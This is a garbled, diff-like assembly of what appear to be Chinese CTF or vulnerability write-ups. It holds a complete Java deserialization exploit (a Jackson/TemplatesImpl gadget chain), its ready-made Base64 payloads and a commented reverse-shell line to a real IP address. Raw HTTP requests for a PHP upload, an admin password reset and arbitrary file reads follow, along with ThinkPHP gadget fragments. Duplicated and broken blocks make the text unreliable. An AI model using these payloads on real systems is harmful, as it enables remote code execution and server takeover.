ClassPool cp = ClassPool.getDefault(); cp.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = cp.makeClass("evil"); String cmd ="java.lang.Runtime.getRuntime().exec("calc");"; // String cmd ="java.lang.Runtime.getRuntime().exec("sh -i >& /dev/tcp/154.201.70.35/8080 0>&1");"; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(cp.get(AbstractTranslet.class.getName())); returnnew byte[][]{cc.toBytecode()}; } public static <T> void setValue(Object obj, String fname, T f) throws Exception { Field filed = TemplatesImpl.class.getDeclaredField(fname); filed.setAccessible(true); filed.set(obj, f); }}// Base64 Payload:// rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAACc3IAOGNvbS5mYXN0ZXJ4bWwuamFja3Nvbi5hbm5vdGF0aW9uLk9iamVjdElkR2VuZXJhdG9yJElkS2V5AAAAAAAAAAECAARJAAhoYXNoQ29kZUwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wABXNjb3BldAARTGphdmEvbGFuZy9DbGFzcztMAAR0eXBlcQB+AAR4cAAAAABzcgAxY29tLnN1bi5vcmcuYXBhY2hlLnhwYXRoLmludGVybmFsLm9iamVjdHMuWFN0cmluZxwKJztIFsX9AgAAeHIAMWNvbS5zdW4ub3JnLmFwYWNoZS54cGF0aC5pbnRlcm5hbC5vYmplY3RzLlhPYmplY3T0mBIJu3u2GQIAAUwABW1fb2JqcQB+AAN4cgAsY29tLnN1bi5vcmcuYXBhY2hlLnhwYXRoLmludGVybmFsLkV4cHJlc3Npb24H2aYcjays1gIAAUwACG1fcGFyZW50dAAyTGNvbS9zdW4vb3JnL2FwYWNoZS94cGF0aC9pbnRlcm5hbC9FeHByZXNzaW9uTm9kZTt4cHB0AAB2cgAQamF2YS5sYW5nLk9iamVjdAAAAAAAAAAAAAAAeHBxAH4ADXQAAXhzcQB+AAIAAAAAc3IALGNvbS5mYXN0ZXJ4bWwuamFja3Nvbi5kYXRhYmluZC5ub2RlLlBPSk9Ob2RlAAAAAAAAAAICAAFMAAZfdmFsdWVxAH4AA3hyAC1jb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5WYWx1ZU5vZGUAAAAAAAAAAQIAAHhyADBjb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5CYXNlSnNvbk5vZGUAAAAAAAAAAQIAAHhwc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0/BbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////91cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAABmMr+ur4AAAA0ABsBAARldmlsBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEBAAg8Y2xpbml0PgEAAygpVgEABENvZGUBABFqYXZhL2xhbmcvUnVudGltZQcACgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMAAwADQoACwAOAQAEY2FsYwgAEAEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMABIAEwoACwAUAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAFgEABjxpbml0PgwAGAAICgAXABkAIQACABcAAAAAAAIACAAHAAgAAQAJAAAAFgACAAAAAAAKuAAPEhG2ABVXsQAAAAAAAQAYAAgAAQAJAAAAEQABAAEAAAAFKrcAGrEAAAAAAAEABQAAAAIABnB0AAdQaGFudG9tcHcBAHhxAH4ADXEAfgANdAABYXg=// URL Encoded Payload:// rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAACc3IAOGNvbS5mYXN0ZXJ4bWwuamFja3Nvbi5hbm5vdGF0aW9uLk9iamVjdElkR2VuZXJhdG9yJElkS2V5AAAAAAAAAAECAARJAAhoYXNoQ29kZUwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wABXNjb3BldAARTGphdmEvbGFuZy9DbGFzcztMAAR0eXBlcQB%2BAAR4cAAAAABzcgAxY29tLnN1bi5vcmcuYXBhY2hlLnhwYXRoLmludGVybmFsLm9iamVjdHMuWFN0cmluZxwKJztIFsX9AgAAeHIAMWNvbS5zdW4ub3JnLmFwYWNoZS54cGF0aC5pbnRlcm5hbC5vYmplY3RzLlhPYmplY3T0mBIJu3u2GQIAAUwABW1fb2JqcQB%2BAAN4cgAsY29tLnN1bi5vcmcuYXBhY2hlLnhwYXRoLmludGVybmFsLkV4cHJlc3Npb24H2aYcjays1gIAAUwACG1fcGFyZW50dAAyTGNvbS9zdW4vb3JnL2FwYWNoZS94cGF0aC9pbnRlcm5hbC9FeHByZXNzaW9uTm9kZTt4cHB0AAB2cgAQamF2YS5sYW5nLk9iamVjdAAAAAAAAAAAAAAAeHBxAH4ADXQAAXhzcQB%2BAAIAAAAAc3IALGNvbS5mYXN0ZXJ4bWwuamFja3Nvbi5kYXRhYmluZC5ub2RlLlBPSk9Ob2RlAAAAAAAAAAICAAFMAAZfdmFsdWVxAH4AA3hyAC1jb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5WYWx1ZU5vZGUAAAAAAAAAAQIAAHhyADBjb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5CYXNlSnNvbk5vZGUAAAAAAAAAAQIAAHhwc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0%2FBbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP%2F%2F%2F%2F91cgADW1tCS%2F0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAABmMr%2Bur4AAAA0ABsBAARldmlsBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEBAAg8Y2xpbml0PgEAAygpVgEABENvZGUBABFqYXZhL2xhbmcvUnVudGltZQcACgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMAAwADQoACwAOAQAEY2FsYwgAEAEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMABIAEwoACwAUAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAFgEABjxpbml0PgwAGAAICgAXABkAIQACABcAAAAAAAIACAAHAAgAAQAJAAAAFgACAAAAAAAKuAAPEhG2ABVXsQAAAAAAAQAYAAgAAQAJAAAAEQABAAEAAAAFKrcAGrEAAAAAAAEABQAAAAIABnB0AAdQaGFudG9tcHcBAHhxAH4ADXEAfgANdAABYXg%3D
+import com.fasterxml.jackson.annotation.ObjectIdGenerator;
+import com.fasterxml.jackson.databind.node.POJONode;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import com.sun.org.apache.xpath.internal.objects.XString;
+import javassist.ClassClassPath;
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.CtMethod;
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.net.URLEncoder;
+import java.util.Base64;
+import java.util.HashMap;public class exp { public static void main(String[] args) throws Exception { CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode"); CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace"); ctClass.removeMethod(writeReplace); ctClass.toClass(); TemplatesImpl tmp = new TemplatesImpl(); setValue(tmp,"_tfactory", new TransformerFactoryImpl()); setValue(tmp,"_name","Phantom"); setValue(tmp,"_bytecodes", generateEvilBytes()); POJONode pojoNode = new POJONode(tmp); ObjectIdGenerator.IdKey idkey1 = new ObjectIdGenerator.IdKey(Object.class, Object.class, new XString("")); ObjectIdGenerator.IdKey idkey2 = new ObjectIdGenerator.IdKey(Object.class, Object.class, pojoNode); setFieldValue(idkey1,"hashCode", 0); setFieldValue(idkey2,"hashCode", 2); HashMap<Object, Object> hashMap = new HashMap<Object, Object>(); hashMap.put(idkey1,"x"); hashMap.put(idkey2,"a"); setFieldValue(idkey2,"hashCode", 0); byte[] serializedData = serialize(hashMap); String base64Payload = Base64.getEncoder().encodeToString(serializedData); String urlEncodedPayload = URLEncoder.encode(base64Payload,"UTF-8"); System.out.println("Base64 Payload:"); System.out.println(base64Payload); System.out.println("nURL Encoded Payload:"); System.out.println(urlEncodedPayload); // unserialize(serializedData); } public static byte[] serialize(Object obj) throws Exception { ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream objo = new ObjectOutputStream(baos); objo.writeObject(obj); objo.close(); returnbaos.toByteArray(); } public static void unserialize(byte[] string) throws Exception { ByteArrayInputStream bais = new ByteArrayInputStream(string); ObjectInputStream obji = new ObjectInputStream(bais); obji.readObject(); obji.close(); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static byte[][] generateEvilBytes() throws Exception { ClassPool cp = ClassPool.getDefault(); cp.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = cp.makeClass("evil"); String cmd ="java.lang.Runtime.getRuntime().exec("calc");"; // String cmd ="java.lang.Runtime.getRuntime().exec("sh -i >& /dev/tcp/154.201.70.35/8080 0>&1");"; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(cp.get(AbstractTranslet.class.getName())); returnnew byte[][]{cc.toBytecode()}; } public static <T> void setValue(Object obj, String fname, T f) throws Exception { Field filed = TemplatesImpl.class.getDeclaredField(fname); filed.setAccessible(true); filed.set(obj, f); }}// Base64 Payload:// rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAACc3IAOGNvbS5mYXN0ZXJ4bWwuamFja3Nvbi5hbm5vdGF0aW9uLk9iamVjdElkR2VuZXJhdG9yJElkS2V5AAAAAAAAAAECAARJAAhoYXNoQ29kZUwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wABXNjb3BldAARTGphdmEvbGFuZy9DbGFzcztMAAR0eXBlcQB+AAR4cAAAAABzcgAxY29tLnN1bi5vcmcuYXBhY2hlLnhwYXRoLmludGVybmFsLm9iamVjdHMuWFN0cmluZxwKJztIFsX9AgAAeHIAMWNvbS5zdW4ub3JnLmFwYWNoZS54cGF0aC5pbnRlcm5hbC5vYmplY3RzLlhPYmplY3T0mBIJu3u2GQIAAUwABW1fb2JqcQB+AAN4cgAsY29tLnN1bi5vcmcuYXBhY2hlLnhwYXRoLmludGVybmFsLkV4cHJlc3Npb24H2aYcjays1gIAAUwACG1fcGFyZW50dAAyTGNvbS9zdW4vb3JnL2FwYWNoZS94cGF0aC9pbnRlcm5hbC9FeHByZXNzaW9uTm9kZTt4cHB0AAB2cgAQamF2YS5sYW5nLk9iamVjdAAAAAAAAAAAAAAAeHBxAH4ADXQAAXhzcQB+AAIAAAAAc3IALGNvbS5mYXN0ZXJ4bWwuamFja3Nvbi5kYXRhYmluZC5ub2RlLlBPSk9Ob2RlAAAAAAAAAAICAAFMAAZfdmFsdWVxAH4AA3hyAC1jb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5WYWx1ZU5vZGUAAAAAAAAAAQIAAHhyADBjb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5CYXNlSnNvbk5vZGUAAAAAAAAAAQIAAHhwc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0/BbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////91cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAABmMr+ur4AAAA0ABsBAARldmlsBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEBAAg8Y2xpbml0PgEAAygpVgEABENvZGUBABFqYXZhL2xhbmcvUnVudGltZQcACgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMAAwADQoACwAOAQAEY2FsYwgAEAEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMABIAEwoACwAUAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAFgEABjxpbml0PgwAGAAICgAXABkAIQACABcAAAAAAAIACAAHAAgAAQAJAAAAFgACAAAAAAAKuAAPEhG2ABVXsQAAAAAAAQAYAAgAAQAJAAAAEQABAAEAAAAFKrcAGrEAAAAAAAEABQAAAAIABnB0AAdQaGFudG9tcHcBAHhxAH4ADXEAfgANdAABYXg=// URL Encoded Payload:// rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAACc3IAOGNvbS5mYXN0ZXJ4bWwuamFja3Nvbi5hbm5vdGF0aW9uLk9iamVjdElkR2VuZXJhdG9yJElkS2V5AAAAAAAAAAECAARJAAhoYXNoQ29kZUwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wABXNjb3BldAARTGphdmEvbGFuZy9DbGFzcztMAAR0eXBlcQB%2BAAR4cAAAAABzcgAxY29tLnN1bi5vcmcuYXBhY2hlLnhwYXRoLmludGVybmFsLm9iamVjdHMuWFN0cmluZxwKJztIFsX9AgAAeHIAMWNvbS5zdW4ub3JnLmFwYWNoZS54cGF0aC5pbnRlcm5hbC5vYmplY3RzLlhPYmplY3T0mBIJu3u2GQIAAUwABW1fb2JqcQB%2BAAN4cgAsY29tLnN1bi5vcmcuYXBhY2hlLnhwYXRoLmludGVybmFsLkV4cHJlc3Npb24H2aYcjays1gIAAUwACG1fcGFyZW50dAAyTGNvbS9zdW4vb3JnL2FwYWNoZS94cGF0aC9pbnRlcm5hbC9FeHByZXNzaW9uTm9kZTt4cHB0AAB2cgAQamF2YS5sYW5nLk9iamVjdAAAAAAAAAAAAAAAeHBxAH4ADXQAAXhzcQB%2BAAIAAAAAc3IALGNvbS5mYXN0ZXJ4bWwuamFja3Nvbi5kYXRhYmluZC5ub2RlLlBPSk9Ob2RlAAAAAAAAAAICAAFMAAZfdmFsdWVxAH4AA3hyAC1jb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5WYWx1ZU5vZGUAAAAAAAAAAQIAAHhyADBjb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5CYXNlSnNvbk5vZGUAAAAAAAAAAQIAAHhwc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0%2FBbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP%2F%2F%2F%2F91cgADW1tCS%2F0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAABmMr%2Bur4AAAA0ABsBAARldmlsBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEBAAg8Y2xpbml0PgEAAygpVgEABENvZGUBABFqYXZhL2xhbmcvUnVudGltZQcACgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMAAwADQoACwAOAQAEY2FsYwgAEAEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMABIAEwoACwAUAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAFgEABjxpbml0PgwAGAAICgAXABkAIQACABcAAAAAAAIACAAHAAgAAQAJAAAAFgACAAAAAAAKuAAPEhG2ABVXsQAAAAAAAQAYAAgAAQAJAAAAEQABAAEAAAAFKrcAGrEAAAAAAAEABQAAAAIABnB0AAdQaGFudG9tcHcBAHhxAH4ADXEAfgANdAABYXg%3D
 
 这道题我从比赛结束后当天晚上都开始研究了，一开始我是准备用fastjson2打，当时一直做到第二天凌晨很晚也没做出来，想到早上还得去上课于是就没有继续研究了
 
@@ -245,109 +372,151 @@ Z0Scan设计与实现：通用插件与分布式扫描新思路
 
 
 ```
-POST /adminapi/upload/file HTTP/1.1Host: 192.168.2.27:8091token: c44e3426e73f3f7c1a7562ce1cacb962Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gWContent-Length: 198------WebKitFormBoundary7MA4YWxkTrZu0gWContent-Disposition: form-data; name="file"; filename="123.php"Content-Type: image/png<?php phpinfo();?>------WebKitFormBoundary7MA4YWxkTrZu0gW--
-```
-
-
-
-```
-POST /adminapi/auth.admin/edit HTTP/1.1Host: 127.0.0.1:2998Content-Length: 247sec-ch-ua:version: 1.9.4sec-ch-ua-mobile: ?0User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36Content-Type: application/json;charset=UTF-8Accept: application/json, text/plain, */*sec-ch-ua-platform:""Origin: http://127.0.0.1:2998Sec-Fetch-Site: same-originSec-Fetch-Mode: corsSec-Fetch-Dest: emptyReferer: http://127.0.0.1:2998/admin/permission/adminAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: http304ok=1; thinkphp_show_page_trace=0|0Connection: close{"id":1,"account":"admin","name":"admin","dept_id":[1],"jobs_id":[],"role_id":[],"avatar":"http://127.0.0.1:2998/resource/image/adminapi/default/avatar.png","password":"admin1","password_confirm":"admin1","disable":0,"multipoint_login":1,"root":1}
-```
-
-
-
-```
-POST /adminapi/file/readHTTP/1.1Host: 127.0.0.1:2998Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: thinkphp_show_page_trace=0|0Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 17file=E:\test.txt
-```
-
-
-
-```
+POST /adminapi/upload/file HTTP/1.1Host: 192.168.2.27:
+8091token: c44e3426e73f3f7c1a7562ce1cacb962Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gWContent-Length: 198------WebKitFormBoundary7MA4YWxkTrZu0gWContent-Disposition: form-data; name="file"; filename="123.php"Content-Type: image/png<?php phpinfo();?>------WebKitFormBoundary7MA4YWxkTrZu0gW--
+POST /adminapi/auth.admin/edit HTTP/1.1Host: 127.0.0.1:
+2998Content-Length: 247sec-ch-ua:
+version: 1.9.4sec-ch-ua-mobile: ?0User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36Content-Type: application/json;charset=UTF-8Accept: application/json, text/plain, */*sec-ch-ua-platform:""Origin: http://127.0.0.1:
+2998Sec-Fetch-Site: same-originSec-Fetch-Mode: corsSec-Fetch-Dest: emptyReferer: http://127.0.0.1:
+2998/admin/permission/adminAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: http304ok=1; thinkphp_show_page_trace=0|0Connection: close{"id":1,"account":"admin","name":"admin","dept_id":[1],"jobs_id":[],"role_id":[],"avatar":"http://127.0.0.1:
+2998/resource/image/adminapi/default/avatar.png","password":"admin1","password_confirm":"admin1","disable":0,"multipoint_login":1,"root":1}
+POST /adminapi/file/readHTTP/1.1Host: 127.0.0.1:
+2998Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: thinkphp_show_page_trace=0|0Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 17file=E:\test.txt
 class ResourceRegister{ /** * 资源路由 * @var Resource */ protected$resource; /** * 是否注册过 * @var bool class Rule */ protected$registered=false; /** * 架构函数 * @access public * @param Resource $resource 资源路由 */ publicfunction__construct(Resource$resource) { $this->resource =$resource; } /** * 注册资源路由 * @access protected * @returnvoid */ protectedfunctionregister() { $this->registered =true; $this->resource->parseGroupRule($this->resource->getRule()); } /** * 动态方法 * @access public * @param string$method方法名 * @param array $args 调用参数 * @returnmixed */ publicfunction__call($method,$args) { returncall_user_func_array([$this->resource,$method],$args); } publicfunction__destruct() { if(!$this->registered) { $this->register(); } }}
-```
-
-
-
-```
 // thinkrouteResource 继承自 RuleGroup// RuleGroup 继承自 Ruleabstract class Rule { protected$rule="1.2"; protected$option= ["var"=> ["1"=> new Pivot()]];}
-```
-
-
-
-```
-class Validate{ /** * 自定义验证类型 * @var array */ protected$type= []; /** * 验证类型别名 * @var array */ protected$alias= [ '>'=>'gt','>='=>'egt','<'=>'lt','<='=>'elt','='=>'eq','same'=>'eq', ]; /** * 当前验证规则 * @var array */ protected$rule= []; /** * 验证提示信息 * @var array */ protected$message= []; /** * 验证字段描述 * @var array */ protected$field= []; /** * 默认规则提示 * @var array */ protected$typeMsg= [ 'require' =>':attribute require', 'must' =>':attribute must', 'number' =>':attribute must be numeric', 'integer' =>':attribute must be integer', 'float' =>':attribute must be float', 'string' =>':attribute must be string', 'boolean' =>':attribute must be bool', 'email' =>':attribute not a valid email address', 'mobile' =>':attribute not a valid mobile', 'array' =>':attribute must be a array', 'accepted' =>':attribute must be yes,on or 1', 'date' =>':attribute not a valid datetime', 'file' =>':attribute not a valid file', 'image' =>':attribute not a valid image', 'alpha' =>':attribute must be alpha', 'alphaNum' =>':attribute must be alpha-numeric', 'alphaDash' =>':attribute must be alpha-numeric, dash, underscore', 'activeUrl' =>':attribute not a valid domain or ip', 'chs' =>':attribute must be chinese', 'chsAlpha' =>':attribute must be chinese or alpha', 'chsAlphaNum'=>':attribute must be chinese,alpha-numeric', 'chsDash' =>':attribute must be chinese,alpha-numeric,underscore, dash', 'url' =>':attribute not a valid url', 'ip' =>':attribute not a valid ip', 'dateFormat' =>':attribute must be dateFormat of :rule', 'in' =>':attribute must be in :rule', 'notIn' =>':attribute be notin :rule', 'between' =>':attribute must between :1 - :2', 'notBetween' =>':attribute not between :1 - :2', 'length' =>'size of :attribute must be :rule', 'max' =>'max size of :attribute must be :rule', 'min' =>'min size of :attribute must be :rule', 'after' =>':attribute cannot be less than :rule', 'before' =>':attribute cannot exceed :rule', 'expire' =>':attribute not within :rule', 'allowIp' =>'access IP is not allowed', 'denyIp' =>'access IP denied', 'confirm' =>':attribute out of accord with :2', 'different' =>':attribute cannot be same with :2', 'egt' =>':attribute must greater than or equal :rule', 'gt' =>':attribute must greater than :rule', 'elt' =>':attribute must less than or equal :rule', 'lt' =>':attribute must less than :rule', 'eq' =>':attribute must equal :rule', 'unique' =>':attribute has exists', 'regex' =>':attribute not conform to the rules', 'method' =>'invalid Request method', 'token' =>'invalid token', 'fileSize' =>'filesize not match', 'fileExt' =>'extensions to upload is not allowed', 'fileMime' =>'mimetype to upload is not allowed', 'startWith' =>':attribute must start with :rule', 'endWith' =>':attribute must end with :rule', 'contain' =>':attribute must contain :rule', ]; /** * 当前验证场景 * @var string */ protected$currentScene; /** * 内置正则验证规则 * @var array */ protected$defaultRegex= [ 'alpha' =>'/^[A-Za-z]+$/', 'alphaNum' =>'/^[A-Za-z0-9]+$/', 'alphaDash' =>'/^[A-Za-z0-9-_]+$/', 'chs' =>'/^[p{Han}]+$/u', 'chsAlpha' =>'/^[p{Han}a-zA-Z]+$/u', 'chsAlphaNum'=>'/^[p{Han}a-zA-Z0-9]+$/u', 'chsDash' =>'/^[p{Han}a-zA-Z0-9_-]+$/u', 'mobile' =>'/^1[3-9]d{9}$/', 'idCard' =>'/(^[1-9]d{5}(18|19|([23]d))d{2}((0[1-9])|(10|11|12))(([0-2][1-9])|10|20|30|31)d{3}[0-9Xx]$)|(^[1-9]d{5}d{2}((0[1-9])|(10|11|12))(([0-2][1-9])|10|20|30|31)d{3}$)/', 'zip' =>'/d{6}/', ]; /** * Filter_var 规则 * @var array */ protected$filter= [ 'email' => FILTER_VALIDATE_EMAIL, 'ip' => [FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 | FILTER_FLAG_IPV6], 'integer'=> FILTER_VALIDATE_INT, 'url' => FILTER_VALIDATE_URL, 'macAddr'=> FILTER_VALIDATE_MAC, 'float' => FILTER_VALIDATE_FLOAT, ]; /** * 验证场景定义 * @var array */ protected$scene= [];因此可以劫持hidden映射给systemclass Validate { protected$type= ["hidden"=>"system"];}
-```
-
-
-
-```
+class Validate{ /** * 自定义验证类型 * @var array */ protected$type= []; /** * 验证类型别名 * @var array */ protected$alias= [ '>'=>'gt','>='=>'egt','<'=>'lt','<='=>'elt','='=>'eq','same'=>'eq', ]; /** * 当前验证规则 * @var array */ protected$rule= []; /** * 验证提示信息 * @var array */ protected$message= []; /** * 验证字段描述 * @var array */ protected$field= []; /** * 默认规则提示 * @var array */ protected$typeMsg= [ 'require' =>':
+attribute require', 'must' =>':
+attribute must', 'number' =>':
+attribute must be numeric', 'integer' =>':
+attribute must be integer', 'float' =>':
+attribute must be float', 'string' =>':
+attribute must be string', 'boolean' =>':
+attribute must be bool', 'email' =>':
+attribute not a valid email address', 'mobile' =>':
+attribute not a valid mobile', 'array' =>':
+attribute must be a array', 'accepted' =>':
+attribute must be yes,on or 1', 'date' =>':
+attribute not a valid datetime', 'file' =>':
+attribute not a valid file', 'image' =>':
+attribute not a valid image', 'alpha' =>':
+attribute must be alpha', 'alphaNum' =>':
+attribute must be alpha-numeric', 'alphaDash' =>':
+attribute must be alpha-numeric, dash, underscore', 'activeUrl' =>':
+attribute not a valid domain or ip', 'chs' =>':
+attribute must be chinese', 'chsAlpha' =>':
+attribute must be chinese or alpha', 'chsAlphaNum'=>':
+attribute must be chinese,alpha-numeric', 'chsDash' =>':
+attribute must be chinese,alpha-numeric,underscore, dash', 'url' =>':
+attribute not a valid url', 'ip' =>':
+attribute not a valid ip', 'dateFormat' =>':
+attribute must be dateFormat of :
+rule', 'in' =>':
+attribute must be in :
+rule', 'notIn' =>':
+attribute be notin :
+rule', 'between' =>':
+attribute must between :1 - :2', 'notBetween' =>':
+attribute not between :1 - :2', 'length' =>'size of :
+attribute must be :
+rule', 'max' =>'max size of :
+attribute must be :
+rule', 'min' =>'min size of :
+attribute must be :
+rule', 'after' =>':
+attribute cannot be less than :
+rule', 'before' =>':
+attribute cannot exceed :
+rule', 'expire' =>':
+attribute not within :
